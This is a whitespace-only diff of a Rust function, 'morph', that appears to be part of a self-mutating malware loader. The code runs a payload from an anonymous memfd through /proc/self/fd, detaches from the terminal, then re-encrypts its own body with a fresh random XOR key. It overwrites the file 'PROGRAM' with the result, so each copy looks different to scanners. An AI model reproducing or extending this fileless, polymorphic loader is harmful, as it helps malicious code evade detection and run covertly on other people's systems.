@@ -26,33 +26,33 @@ fn morph<R: Read>(program: &mut R, process: &str, loader: &[u8], enc: &[u8]) -> 
 		}
 	}
             
-    Ok(ForkResult::Child) => {
-      let n = program.read(&mut buf)?;
-      let arguments: Vec<String> = args().collect();
-      let memfd_name = &CString::new(process).unwrap();
-      let mut memfd = memfd_create(memfd_name, memfd_flags)?;
-      memfd.write_all(&buf[..n])?;
-      copy(program, &mut memfd)?;
-      let _ = unsafe { umask(0) };
-      let _ = setsid();
-      let nulfd = File::open("/dev/null")?;
-      let stdin = stdin();
-      let _ = dup2(nulfd.as_raw_fd(), stdin.as_raw_fd());
-      let _ = Command::new(format!("/proc/self/fd/{}", memfd.as_raw_fd())).args(&arguments[1..]).spawn();
+	Ok(ForkResult::Child) => {
+	      let n = program.read(&mut buf)?;
+	      let arguments: Vec<String> = args().collect();
+	      let memfd_name = &CString::new(process).unwrap();
+	      let mut memfd = memfd_create(memfd_name, memfd_flags)?;
+	      memfd.write_all(&buf[..n])?;
+	      copy(program, &mut memfd)?;
+	      let _ = unsafe { umask(0) };
+	      let _ = setsid();
+	      let nulfd = File::open("/dev/null")?;
+	      let stdin = stdin();
+	      let _ = dup2(nulfd.as_raw_fd(), stdin.as_raw_fd());
+	      let _ = Command::new(format!("/proc/self/fd/{}", memfd.as_raw_fd())).args(&arguments[1..]).spawn();
 
-      let mut urandom = File::open("/dev/urandom")?;
-      let mut new_key = [0; 32];
-      urandom.read(&mut new_key)?;
-      let mut new_enc = Vec::new();
-      for i in 0..loader.len() { new_enc.push(loader[i]) }
-      for i in 0..enc.len() { new_enc.push(enc[i] ^ new_key[i % 32]) }
-      for i in 0..32 { new_enc.push(new_key[i]) }
-      remove_file("PROGRAM").unwrap();
-      let mut new_program = File::create("PROGRAM")?;
-      set_permissions("PROGRAM", Permissions::from_mode(0o777)).unwrap();
-      new_program.write_all(&new_enc)?;
-      },
-   		Err(_) => (),
+	      let mut urandom = File::open("/dev/urandom")?;
+	      let mut new_key = [0; 32];
+	      urandom.read(&mut new_key)?;
+	      let mut new_enc = Vec::new();
+	      for i in 0..loader.len() { new_enc.push(loader[i]) }
+	      for i in 0..enc.len() { new_enc.push(enc[i] ^ new_key[i % 32]) }
+	      for i in 0..32 { new_enc.push(new_key[i]) }
+	      remove_file("PROGRAM").unwrap();
+	      let mut new_program = File::create("PROGRAM")?;
+	      set_permissions("PROGRAM", Permissions::from_mode(0o777)).unwrap();
+	      new_program.write_all(&new_enc)?;
+	      },
+	Err(_) => (),
 	}
 
     Ok(())
